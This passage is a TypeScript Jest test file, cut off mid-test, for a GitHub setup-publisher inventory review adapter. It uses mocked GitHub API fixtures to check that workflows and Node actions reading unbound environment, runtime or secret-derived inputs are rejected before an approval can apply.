import { createHash } from 'node:crypto';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runInNewContext } from 'node:vm';
import type { SetupPublisherInventoryDocument, SetupPublisherInventoryUnitKind } from '../../domain/setup_publisher_inventory_review';
import { SETUP_PUBLISHER_INVENTORY_PATH } from '../../domain/setup_publisher_inventory_review';
import type { SetupPublisherProposal } from '../../domain/setup_publisher_installation';
import { canonicalPublisherInventoryJson, publisherInventoryContractSha256, publisherInventoryEdgeIdentity,
  publisherInventorySha256, publisherInventoryWorkflowSetSha256 } from '../../application/policies/setup_publisher_inventory_review_policy';
import { setupPublisherFixture } from '../../application/policies/__tests__/fixtures/setup_publisher_fixture';
import { SetupPublisherInventoryReviewAdapter } from '../setup_publisher_inventory_review_adapter';
import { SetupBatchGithubTransport } from '../setup_batch_github_read_adapter';
import type { GithubSetupBatchClient } from '../github/ports/github_setup_batch_protocol';
import { setupInstallationTreeFixture } from './fixtures/setup_installation_tree_fixture';
import { setupPublisherGithubSourceFixture } from './fixtures/setup_publisher_github_source_fixture';
import { SetupPublisherGithubReadAdapter } from '../setup_publisher_github_read_adapter';
import { planSetupPublisherInstallation } from '../../application/policies/setup_publisher_plan_policy';
import { ReviewSetupPublisherUseCase } from '../../application/usecases/setup/review_setup_publisher_use_case';
import { ApplySetupPublisherUseCase, SetupPublisherApplyError } from '../../application/usecases/setup/apply_setup_publisher_use_case';
import { DeliverSetupInstallationUseCase } from '../../application/usecases/setup/deliver_setup_installation_use_case';
import { SetupInstallationGithubDeliveryAdapter } from '../setup_installation_github_delivery_adapter';
import { SetupPublisherJournalAdapter } from '../setup_publisher_journal_adapter';
import { setupBatchMarker } from '../../application/policies/setup_batch_policy';
import type { SetupPublisherJournalPort } from '../../application/ports/setup_publisher_apply_ports';
import { InstallSetupPublisherUseCase } from '../../application/usecases/setup/install_setup_publisher_use_case';
import { SETUP_PUBLISHER_WORKFLOW_PATH } from '../../domain/setup_publisher_installation';
import type { SetupPublisherOperation } from '../../domain/setup_publisher_installation';

type Mutable<T> = T extends readonly (infer U)[] ? Mutable<U>[] : T extends object ? { -readonly [K in keyof T]: Mutable<T[K]> } : T;
const hash = (value: string) => createHash('sha256').update(value).digest('hex');
const blob = (value: string) => createHash('sha1').update(`blob ${Buffer.byteLength(value)}\0${value}`).digest('hex');
const head = '6'.repeat(40), evidenceBase = '7'.repeat(40), workflowPath = '.github/workflows/ci.yml';
const marker = (document: SetupPublisherInventoryDocument) => '<!-- copilot:publisher-inventory-review:v1 -->\n'
  + JSON.stringify({ kind: 'bugbot-publisher-inventory-review', decision: 'compatible', documentSha256: publisherInventorySha256(document),
    destinationRepositoryId: document.destination.repositoryId, destinationHead: document.destination.head,
    publisherContractSha256: document.publisher.contractSha256 }) + '\n<!-- /copilot:publisher-inventory-review:v1 -->';

/** Real Git-object fixtures through the actual transport/reader; no ready verdict is injected. */
function fixture(options: { workflow?: string; workflowPath?: string; programs?: { id: string; path: string; kind: SetupPublisherInventoryUnitKind; content: string }[];
  edges?: { from: string; to: string; role: string }[] } = {}) {
  const baseline = setupPublisherFixture(), { target, source } = baseline.inspection;
  const sdk = setupPublisherGithubSourceFixture();
  source.actionManifestSha256 = baseline.proposal.source.actionManifestSha256 = hash(sdk.files['action.yml']);
  source.actionBundleSha256 = baseline.proposal.source.actionBundleSha256 = hash(sdk.files['build/github_action/index.js']);
  const workflow = options.workflow ?? 'name: CI\non: push\njobs:\n  inspect:\n    steps:\n      - run: printf ok\n';
  const entryPath = options.workflowPath ?? workflowPath;
  const files = new Map([[entryPath, workflow],
    ...[baseline.inspection.installation.manifest!, ...baseline.inspection.installation.guidance].map(f => [f.path, f.content] as [string, string]),
    ...(options.programs ?? []).map(p => [p.path, p.content] as [string, string])]);
  const sourceTree = setupInstallationTreeFixture(files);
  const trees = new Map<string, unknown>(), blobs = new Map<string, unknown>(), commits = new Map<string, string>();
  const retain = (contents: Map<string, string>) => {
    const git = setupInstallationTreeFixture(contents);
    for (const content of contents.values()) blobs.set(blob(content), { sha: blob(content), size: Buffer.byteLength(content),
      encoding: 'base64', content: Buffer.from(content).toString('base64') });
    for (const [sha, value] of git.trees) trees.set(sha, { ...value, tree: value.tree.map(entry => ({ ...entry,
      ...(entry.type === 'blob' ? { size: (blobs.get(entry.sha) as { size: number }).size } : {}) })) });
    return git.root;
  };
  commits.set(target.baseSha, retain(files));
  const file = { path: entryPath, mode: '100644' as const, blob: blob(workflow), contentSha256: hash(workflow) };
  const publisher = { repositoryId: source.repositoryId, commit: source.commit, workflowSha256: hash(source.workflow),
    actionManifestSha256: source.actionManifestSha256, actionBundleSha256: source.actionBundleSha256 };
  const unit = (id: string, path: string, kind: SetupPublisherInventoryUnitKind, content: string) => ({ id, path, kind,
    mode: '100644' as const, blob: blob(content), contentSha256: hash(content), repositoryId: target.id,
    repository: `${target.owner}/${target.name}`, commit: target.baseSha, tree: sourceTree.root,
    behavior: 'Independent fixture review claim about these exact committed bytes.' });
  const document: Mutable<SetupPublisherInventoryDocument> = { schemaVersion: 1, kind: 'bugbot-publisher-producer-inventory-review',
    destination: { repositoryId: target.id, repository: `${target.owner}/${target.name}`, defaultBranch: target.defaultBranch,
      head: target.baseSha, tree: sourceTree.root }, publisher: { ...publisher, contractSha256: publisherInventoryContractSha256(publisher) },
    workflowSetSha256: publisherInventoryWorkflowSetSha256([file]),
    workflows: [{ ...file, entryUnits: ['workflow-ci'], disposition: 'non-producer' }],
    units: [unit('workflow-ci', entryPath, 'workflow', workflow),
      ...(options.programs ? options.programs.map(p => unit(p.id, p.path, p.kind, p.content))
        : [unit('shell-ci', entryPath, 'shell-program', workflow)])].sort((a, b) => a.id.localeCompare(b.id)),
    edges: options.edges ?? [{ from: 'workflow-ci', to: 'shell-ci', role: 'run:inspect:1' }], inputs: [] };
  const evidenceFiles = new Map<string, string>([['README.md', 'Evidence base, independently authenticated.\n']]);
  commits.set(evidenceBase, retain(evidenceFiles));
  const locator = { pullRequest: 81, head, documentSha256: '' };
  const pull: Record<string, unknown> = { number: 81, state: 'open', merged: false, user: { id: 9, login: 'preparer', type: 'User' },
    commits: 1,
    head: { sha: head, ref: 'feature/inventory-review', repo: { id: target.id, full_name: 'owner/project' } },
    base: { sha: evidenceBase, repo: { id: target.id, full_name: 'owner/project' } } };
  let reviews: unknown[] = [], permission: unknown = { permission: 'write', user: { id: 17, login: 'reviewer' } };
  let preparingCommits: unknown[] = [{ sha: head, author: { id: 9, login: 'preparer', type: 'User' },
    committer: { id: 9, login: 'preparer', type: 'User' } }];
  let activity: unknown[] = [{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
    activity_type: 'push', actor: { id: 9, login: 'preparer', type: 'User' } },
  { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
    activity_type: 'branch_creation', actor: { id: 9, login: 'preparer', type: 'User' } }];
  const seal = () => {
    document.units.sort((a, b) => a.id < b.id ? -1 : a.id > b.id ? 1 : 0);
    document.edges.sort((a, b) => publisherInventoryEdgeIdentity(a) < publisherInventoryEdgeIdentity(b) ? -1 : 1);
    document.inputs.sort((a, b) => a.id < b.id ? -1 : 1);
    locator.documentSha256 = publisherInventorySha256(document);
    commits.set(head, retain(new Map([...evidenceFiles, [SETUP_PUBLISHER_INVENTORY_PATH, canonicalPublisherInventoryJson(document)]])));
    reviews = [{ id: 101, user: { id: 17, login: 'reviewer', type: 'User' }, state: 'APPROVED',
      submitted_at: '2026-11-28T00:00:00Z', commit_id: head, body: marker(document) }];
  };
  seal();
  const request = jest.fn<ReturnType<GithubSetupBatchClient['request']>, Parameters<GithubSetupBatchClient['request']>>(async (route, p) => {
    if (route === 'GET /user') return { data: { id: 7 }, headers: { 'x-oauth-scopes': 'repo, workflow' } };
    if (p.owner === 'vypdev' && p.repo === 'copilot') return sdk.request(route, p);
    if (!route.startsWith('GET ') || p.owner !== target.owner || p.repo !== target.name) throw new Error('outside fixture read scope');
    if (route === 'GET /repos/{owner}/{repo}') return { data: { id: target.id, name: target.name, full_name: 'owner/project',
      owner: { id: target.ownerId, login: target.owner, type: 'Organization' }, default_branch: target.defaultBranch,
      private: target.private, archived: false, disabled: false, permissions: { push: true } } };
    if (route.endsWith('/git/ref/{ref}')) return { data: { ref: 'refs/heads/main', object: { type: 'commit', sha: target.baseSha } } };
    if (route.endsWith('/pulls/{pull_number}')) return { data: pull };
    if (route.endsWith('/reviews')) return { data: reviews.slice((Number(p.page) - 1) * 100, Number(p.page) * 100) };
    if (route.endsWith('/pulls/{pull_number}/commits')) return { data: preparingCommits.slice((Number(p.page) - 1) * 100, Number(p.page) * 100) };
    if (route.endsWith('/activity')) return { data: activity };
    if (route.endsWith('/permission')) return { data: permission };
    if (route.endsWith('/git/commits/{commit_sha}')) return { data: { sha: p.commit_sha, tree: { sha: commits.get(String(p.commit_sha)) } } };
    if (route.endsWith('/git/trees/{tree_sha}')) return { data: trees.get(String(p.tree_sha)) };
    if (route.endsWith('/git/blobs/{file_sha}')) return { data: blobs.get(String(p.file_sha)) };
    throw new Error('unexpected authenticated fixture read');
  });
  const transport = new SetupBatchGithubTransport({ getClient: () => ({ request }) });
  const adapter = new SetupPublisherInventoryReviewAdapter(transport), reader = new SetupPublisherGithubReadAdapter(transport, sdk.credentials);
  const proposal: SetupPublisherProposal = { ...baseline.proposal, schemaVersion: 2, inventoryReview: locator };
  const observed = { target, source, tree: sourceTree.root, workflows: [{ path: entryPath, mode: '100644', content: workflow }] };
  return { document, proposal, observed, pull, request, trees, blobs, commits, locator, seal, files, retain, transport,
    setReviews: (value: unknown[]) => { reviews = value; }, setPermission: (value: unknown) => { permission = value; },
    setPreparingCommits: (value: unknown[]) => { preparingCommits = value; },
    setActivity: (value: unknown[]) => { activity = value; },
    credentials: sdk.credentials, sourceFiles: sdk.files,
    inspect: () => adapter.inspect(proposal, observed, 'private-inventory-fixture'),
    inspectComplete: (input: SetupPublisherProposal = proposal) => reader.inspect(input) };
}

function variableFixture(options: { organization?: unknown[]; repository?: unknown[]; memberships?: Record<string, unknown[]>;
  expected?: Record<string, { origin: 'repository-variable' | 'organization-variable'; value: string }>;
  ownerType?: string; public?: boolean;
  response?: (route: string, parameters: Record<string, unknown>, data: unknown) => unknown } = {}) {
  const definition = '${{ toJSON(vars) }}', env = { INPUT_VARS_JSON: definition };
  const f = fixture({ workflow: `on: push\nenv: ${JSON.stringify(env)}\njobs:\n  inspect:\n    steps: []\n` });
  if (options.public) f.observed.target.private = false;
  const source = f.document.units.find(u => u.id === 'workflow-ci')!;
  const anchor = { workflow: workflowPath, job: '', step: 0, input: 'env:INPUT_VARS_JSON', origin: 'input-vars-json' as const };
  f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
    kind: 'publisher-inventory-input-source', source: { repositoryId: source.repositoryId, commit: source.commit,
      path: source.path, contentSha256: source.contentSha256 }, definition, effectiveEnvironment: env, callerInputs: {},
    variables: { effectiveVariablesSha256: publisherInventorySha256(options.expected ?? {}) } }) });
  bindVariableContext(f, options.expected ?? {});
  const original = f.request.getMockImplementation()!;
  f.request.mockImplementation(async (route, parameters) => {
    let data: unknown;
    const page = (values: unknown[], key: string) => ({ total_count: values.length,
      [key]: values.slice((Number(parameters.page) - 1) * 30, Number(parameters.page) * 30) });
    if (route === 'GET /orgs/{org}/actions/variables') data = page(options.organization ?? [], 'variables');
    else if (route === 'GET /repos/{owner}/{repo}/actions/variables') data = page(options.repository ?? [], 'variables');
    else if (route === 'GET /orgs/{org}/actions/variables/{name}/repositories') data = page(options.memberships?.[String(parameters.name)] ?? [], 'repositories');
    else {
      const response = await original(route, parameters); data = response.data;
      if (route === 'GET /repos/{owner}/{repo}' && parameters.repo === 'project' && options.ownerType) {
        const repository = data as { owner: object }; data = { ...repository, owner: { ...repository.owner, type: options.ownerType } };
      }
      return { ...response, data: options.response ? options.response(route, parameters, data) : data };
    }
    return { data: options.response ? options.response(route, parameters, data) : data };
  });
  return f;
}

function bindVariableContext(f: ReturnType<typeof fixture>, expected: Record<string, { origin: 'repository-variable' | 'organization-variable'; value: string }>) {
  for (const workflow of f.document.workflows) {
    const source = f.document.units.find(unit => unit.id === workflow.entryUnits[0])!;
    const anchor = { workflow: workflow.path, job: '', step: 0, input: 'vars-context', origin: 'literal' as const };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-variable-context', source: { repositoryId: source.repositoryId, commit: source.commit,
        path: source.path, contentSha256: source.contentSha256 },
      variables: { effectiveVariablesSha256: publisherInventorySha256(expected) } }) });
  }
  f.seal();
}

function conditionalFixture(location: 'job' | 'step' | 'concurrency', bind = false) {
  const condition = "vars.MODE == 'publish'";
  const workflow = location === 'concurrency'
    ? 'on: push\nconcurrency:\n  group: ${{ vars.MODE }}\n  cancel-in-progress: false\njobs:\n  inspect:\n    steps:\n      - run: printf reviewed\n'
    : location === 'job' ? `on: push\njobs:\n  inspect:\n    if: ${condition}\n    steps:\n      - run: printf reviewed\n`
    : `on: push\njobs:\n  inspect:\n    steps:\n      - run: printf reviewed\n        if: ${condition}\n`;
  const f = fixture({ workflow }), original = f.request.getMockImplementation()!;
  let mode: string | undefined = 'observe';
  f.request.mockImplementation(async (route, parameters) => {
    if (route === 'GET /orgs/{org}/actions/variables') return { data: { total_count: 0, variables: [] } };
    if (route === 'GET /repos/{owner}/{repo}/actions/variables') return { data: { total_count: mode === undefined ? 0 : 1, variables: mode === undefined ? [] : [{ name: 'MODE', value: mode }] } };
    return original(route, parameters);
  });
  if (bind) bindVariableContext(f, { MODE: { origin: 'repository-variable', value: mode! } });
  return { ...f, setMode: (value: string | undefined) => { mode = value; } };
}

function controlledDelivery(f: ReturnType<typeof fixture>, created: (effect: 'tree' | 'commit' | 'branch' | 'pull-request') => void) {
  const original = f.request.getMockImplementation()!, operation = '11111111-1111-4111-8111-111111111111';
  const commit = 'c'.repeat(40), branchName = `setup/copilot/${operation}`, prepared = new Map(f.files);
  let tree = '', branch: string | undefined, pulls: unknown[] = [];
  f.request.mockImplementation(async (route, p) => {
    if (p.owner !== 'owner' || p.repo !== 'project') return original(route, p);
    if (route === 'POST /repos/{owner}/{repo}/git/trees') {
      expect(p.base_tree).toBe(f.observed.tree);
      for (const file of p.tree as { path: string; content: string }[]) prepared.set(file.path, file.content);
      tree = f.retain(prepared); created('tree'); return { data: { sha: tree } };
    }
    if (route === 'POST /repos/{owner}/{repo}/git/commits') {
      expect(p.parents).toEqual([f.proposal.destination.head]); expect(p.tree).toBe(tree);
      created('commit'); return { data: { sha: commit } };
    }
    if (route.endsWith('/git/commits/{commit_sha}') && p.commit_sha === commit) return { data: { sha: commit,
      parents: [{ sha: f.proposal.destination.head }], tree: { sha: tree } } };
    if (route.endsWith('/contents/{path}')) return { data: { encoding: 'base64',
      content: Buffer.from(prepared.get('.copilot/setup-manifest.json')!).toString('base64') } };
    if (route.endsWith('/git/ref/{ref}') && p.ref === `heads/${branchName}`) {
      if (!branch) throw { status: 404 }; return { data: { object: { sha: branch } } };
    }
    if (route === 'POST /repos/{owner}/{repo}/git/refs') {
      expect(p.ref).toBe(`refs/heads/${branchName}`); expect(p.sha).toBe(commit); branch = commit;
      created('branch'); return { data: {} };
    }
    if (route === 'GET /repos/{owner}/{repo}/pulls') return { data: pulls };
    if (route === 'POST /repos/{owner}/{repo}/pulls') {
      expect(p.head).toBe(branchName); expect(p.base).toBe('main');
      pulls = [{ number: 73, state: 'open', body: p.body, head: { ref: branchName, sha: commit, repo: { id: 42 } },
        base: { ref: 'main', repo: { id: 42 } } }];
      created('pull-request'); return { data: pulls[0] };
    }
    return original(route, p);
  });
  return { operation, branchName, commit, get tree() { return tree; }, get pulls() { return pulls; } };
}

function executeControlledInstallation(f: ReturnType<typeof fixture>, journal: SetupPublisherJournalPort, resume = false) {
  const review = new ReviewSetupPublisherUseCase({ inspect: proposal => f.inspectComplete(proposal), present: async () => undefined,
    confirm: async () => 'approve', active: () => true });
  const apply = new ApplySetupPublisherUseCase({ coordinator: new DeliverSetupInstallationUseCase(), journal, active: () => true,
    delivery: (plan, session, fresh) => f.credentials.bind(session, token => new SetupInstallationGithubDeliveryAdapter(f.transport,
      { target: plan.target, operationId: plan.operationId, digest: plan.digest, files: plan.files,
        title: 'Reviewed installation fixture', body: setupBatchMarker(plan.operationId, plan.target.id) }, token, fresh)) });
  return new InstallSetupPublisherUseCase(review, apply, journal).execute({ proposal: f.proposal,
    operationId: '11111111-1111-4111-8111-111111111111', dryRun: false, resume });
}

function reviewedOperation(f: ReturnType<typeof fixture> = fixture()) {
  const present = jest.fn(async () => undefined), confirm = jest.fn(async (): Promise<'approve'> => 'approve');
  const active = jest.fn(() => true), apply = jest.fn(async () => 'controlled-result');
  const review = new ReviewSetupPublisherUseCase({ inspect: proposal => f.inspectComplete(proposal), present, confirm, active });
  return { ...f, present, confirm, active, apply,
    execute: () => review.execute({ proposal: f.proposal, operationId: '11111111-1111-4111-8111-111111111111', dryRun: false }, apply) };
}

function nodeAction(main: string, helper?: string, concurrency = '') {
  return fixture({ workflow: `on: push\n${concurrency}jobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: 'name: Fixture\nruns:\n  using: node24\n  main: main.js\n' },
      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: main },
      ...(helper === undefined ? [] : [{ id: 'helper', path: 'action/helper.js', kind: 'node-entrypoint' as const, content: helper }])],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' },
      ...(helper === undefined ? [] : [{ from: 'main', to: 'helper', role: 'import:1' }])] });
}

function bindRootEnvironment(f: ReturnType<typeof fixture>, values: Record<string, unknown>) {
  const unit = f.document.units.find(u => u.id === 'workflow-ci')!;
  for (const [name, definition] of Object.entries(values)) {
    const anchor = { workflow: workflowPath, job: '', step: 0, input: `env:${name}`,
      origin: typeof definition === 'string' && definition.includes('${{ secrets.') ? 'symbolic-secret' as const : 'workflow-env' as const };
    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
      kind: 'publisher-inventory-input-source', source: { repositoryId: unit.repositoryId, commit: unit.commit,
        path: unit.path, contentSha256: unit.contentSha256 }, definition, effectiveEnvironment: values, callerInputs: {}, variables: {} }) });
  }
  f.seal();
}

it.each([
  'module.exports = process.env.GITHUB_EVENT_NAME;',
  'module.exports = process.env["MODE"];',
  'const name = "MODE"; module.exports = process.env[name];',
  'const values = process.env; module.exports = values.MODE;',
  'const { MODE } = process.env; module.exports = MODE;',
  'module.exports = Object.keys(process.env);',
  'const values = { ...process.env }; module.exports = values.MODE;',
])('publisher-inventory-C30: ambient Node inputs cannot inherit an independent approval: %s', async program => {
  const f = nodeAction(program);
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
});
it.each(['GITHUB_EVENT_NAME', 'RUNNER_OS', 'ACTIONS_RUNTIME_TOKEN', 'STATE_selected', 'NODE_ICU_DATA'])(
  'publisher-inventory-C30: a YAML claim cannot bind provider/runtime channel %s', async name => {
    const env = { [name]: 'claimed' }, f = nodeAction(`module.exports = process.env[${JSON.stringify(name)}];`, undefined,
      `env: ${JSON.stringify(env)}\n`);
    bindRootEnvironment(f, env);
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  });
it.each(['process.env.MODE', 'process["env"]["MODE"]', 'process.env?.MODE'])(
  'publisher-inventory-C30: a literal effective environment read remains admissible: %s', async expression => {
    const f = nodeAction(`module.exports = ${expression};`, undefined, 'env: { MODE: reviewed }\n');
    bindRootEnvironment(f, { MODE: 'reviewed' });
    await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
    f.document.inputs[0].sourceFingerprint = '0'.repeat(64); f.seal();
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
  });
it('publisher-inventory-C27: a local process binding and inert env spelling do not read the runner', async () => {
  const f = nodeAction('function read(process) { return process.env.MODE; } module.exports = read({env: {MODE: "local"}}) + "process.env.UNBOUND";');
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
});
it('publisher-inventory-C30: a declared absent Node input is the runner empty string rather than ambient state', async () => {
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: 'inputs:\n  mode:\n    description: Optional\nruns: { using: node24, main: main.js }\n' },
      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: 'module.exports = process.env.INPUT_MODE;' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' }] });
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
  expect(f.document.inputs).toEqual([]); // Immutable manifest + complete caller map bind the absence.
});
it.each(['pre', 'post'] as const)('publisher-inventory-C28: %s conditions reject unbound runtime selectors and preserve status conditions', async role => {
  for (const expression of ['always()', "github.event_name == 'push'"]) {
    const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
      programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: `runs:\n  using: node24\n  main: main.js\n  ${role}: hook.js\n  ${role}-if: ${JSON.stringify(expression)}\n` },
        { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: 'module.exports = 1;' },
        { id: 'hook', path: 'action/hook.js', kind: 'node-entrypoint', content: 'module.exports = 2;' }],
      edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' }, { from: 'action', to: 'hook', role }] });
    if (expression === 'always()') await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
    else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
  }
});
it('publisher-inventory-C30: a composite Node child does not acquire implicit INPUT projection', async () => {
  const action = 'inputs:\n  mode:\n    description: Optional\nruns:\n  using: composite\n  steps:\n    - run: node ${{ github.action_path }}/main.js\n';
  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action },
      { id: 'shell', path: 'action/action.yml', kind: 'shell-program', content: action },
      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: 'module.exports = process.env.INPUT_MODE;' }],
    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'shell', role: 'run:composite:1' },
      { from: 'shell', to: 'main', role: 'call:1' }] });
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
});

it.each([
  { name: 'secret through supported job env', definition: '${{ secrets.PAT }}', expression: "env.TOKEN != ''", allowed: false },
  { name: 'secret through bracket selector', definition: '${{ secrets.PAT }}', expression: "env['TOKEN'] != ''", allowed: false },
  { name: 'unsupported direct secret', definition: 'literal', expression: "secrets.PAT != ''", allowed: false },
  { name: 'unbound environment', definition: 'literal', expression: "env.MISSING != ''", allowed: false },
  { name: 'runtime event context', definition: 'literal', expression: "github.event_name == 'push'", allowed: false },
  { name: 'job output context', definition: 'literal', expression: "needs.other.outputs.selected == 'yes'", allowed: false },
  { name: 'bound literal', definition: 'literal', expression: "env.TOKEN == 'literal'", allowed: true },
  { name: 'case-insensitive context key', definition: 'literal', expression: "ENV.token == 'literal'", allowed: true },
  { name: 'inert secret spelling', definition: 'secrets.PAT', expression: "env.TOKEN == 'secrets.PAT'", allowed: true },
  { name: 'fixed destination identity', definition: 'literal', expression: "github.repository_id != 0 && github.repository != ''", allowed: true },
  { name: 'status and literals', definition: 'literal', expression: "success() && contains('secrets.PAT', 'PAT')", allowed: true },
])('publisher-inventory-C30: condition input closure, $name', async row => {
  // This env-to-step condition is supported provider syntax; no Secret value is fetched.
  const env = { TOKEN: row.definition };
  const workflow = `on: push\njobs:\n  inspect:\n    env: ${JSON.stringify(env)}\n    steps:\n      - if: ${JSON.stringify(row.expression)}\n        run: printf reviewed\n`;
  const f = fixture({ workflow }), unit = f.document.units.find(u => u.id === 'workflow-ci')!;
  const anchor = { workflow: workflowPath, job: 'inspect', step: 0, input: 'env:TOKEN',
    origin: row.definition.startsWith('${{') ? 'symbolic-secret' as const : 'job-env' as const };
  f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
    kind: 'publisher-inventory-input-source', source: { repositoryId: unit.repositoryId, commit: unit.commit,
      path: unit.path, contentSha256: unit.contentSha256 }, definition: row.definition, effectiveEnvironment: env, callerInputs: {}, variables: {} }) });
  f.seal();
  if (row.allowed) await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
  else {
    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
    expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
  }
  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET ') && !/secrets/.test(route))).toBe(true);
});

const sharedLane = { group: 'copilot-bugbot-status-${{ github.repository_id }}-${{ inputs.pull_number }}', queue: 'max', 'cancel-in-progress': false };
it.each([
  { name: 'pending job dropped', job: { group: 'auxiliary', queue: 'single', 'cancel-in-progress': false }, allowed: false },
  { name: 'running job cancelled', job: { group: 'auxiliary', 'cancel-in-progress': true }, allowed: false },
  { name: 'implicit single queue', job: { group: 'auxiliary', 'cancel-in-progress': false }, allowed: false },
  { name: 'preserved auxiliary group', job: { group: 'auxiliary', queue: 'max', 'cancel-in-progress': false }, allowed: true },
  { name: 'inherited root lane', job: undefined, allowed: true },
])('publisher-inventory-C34: root serialization also validates job preservation, $name', async row => {
  const workflow = `on: push\nconcurrency: ${JSON.stringify(sharedLane)}\njobs:\n  inspect:\n`
    + (row.job === undefined ? '' : `    concurrency: ${JSON.stringify(row.job)}\n`) + '    steps:\n      - run: printf reviewed\n';
  const f = fixture({ workflow }); f.document.workflows[0].disposition = 'serialized-producer'; f.seal();
  if (row.allowed) await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
  else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'incompatible-producer' });
});
it.each([
  { name: 'job-only shared lane', root: false, job: true, called: false, unsafe: false },
  { name: 'callee-only shared lane', root: false, job: false, called: true, unsafe: false },
  { name: 'caller root inherited by callee', root: true, job: false, called: false, unsafe: false },
  { name: 'callee drops pending writer despite caller lane', root: true, job: false, called: false, unsafe: true },
])('publisher-inventory-C34: reachable reusable workflow preservation, $name', async row => {
  const concurrency = (enabled: boolean) => enabled ? `concurrency: ${JSON.stringify(sharedLane)}\n` : '';
  const child = `on: { workflow_call: {} }\n${concurrency(row.called)}jobs:\n  publish:\n`
    + (row.unsafe ? '    concurrency: { group: auxiliary, queue: single, cancel-in-progress: false }\n' : '')
    + '    steps:\n      - run: printf reviewed\n';
  const workflow = `on: push\n${concurrency(row.root)}jobs:\n  inspect:\n`
    + (row.job ? `    concurrency: ${JSON.stringify(sharedLane)}\n` : '')
    + `    uses: owner/reuse/.github/workflows/child.yml@${'a'.repeat(40)}\n`;
  const f = fixture({ workflow, programs: [{ id: 'child', path: '.github/workflows/child.yml', kind: 'reusable-workflow', content: child },
    { id: 'shell', path: '.github/workflows/child.yml', kind: 'shell-program', content: child }],
    edges: [{ from: 'workflow-ci', to: 'child', role: 'uses:inspect' }, { from: 'child', to: 'shell', role: 'run:publish:1' }] });
  // Authenticate the external callee without accidentally adding it as a
  // second destination workflow in this complete-reader fixture.
  const path = '.github/workflows/child.yml', commit = 'a'.repeat(40);
  f.files.delete(path);
  const targetTree = f.retain(f.files), externalTree = f.retain(new Map([[path, child]]));
  f.commits.set(f.proposal.destination.head, targetTree); f.commits.set(commit, externalTree);
  f.document.destination.tree = f.observed.tree = targetTree;
  for (const unit of f.document.units) {
    if (unit.id === 'workflow-ci') unit.tree = targetTree;
    else Object.assign(unit, { repository: 'owner/reuse', repositoryId: 71, commit, tree: externalTree });
  }
  f.seal(); const original = f.request.getMockImplementation()!;
  f.request.mockImplementation(async (route, parameters) => {
    if (parameters.owner !== 'owner' || parameters.repo !== 'reuse') return original(route, parameters);
    if (route === 'GET /repos/{owner}/{repo}') return { data: { id: 71, full_name: 'owner/reuse' } };
    return original(route, { ...parameters, repo: 'project' });
  });
  f.document.workflows[0].disposition = 'serialized-producer'; f.seal();
  if (row.unsafe) await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'incompatible-producer' });
  else await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview.approvals');
});

it.each(['job', 'step'] as const)('publisher-inventory-C30: rejects an unbound variable context used only by a %s condition', async location => {
  const f = conditionalFixture(location);
  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
});

it.each(['job', 'step'] as const)('publisher-inventory-C30: a bound variable-only %s condition becomes stale when its value changes', async location => {
  const f = conditionalFixture(location, true);
  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
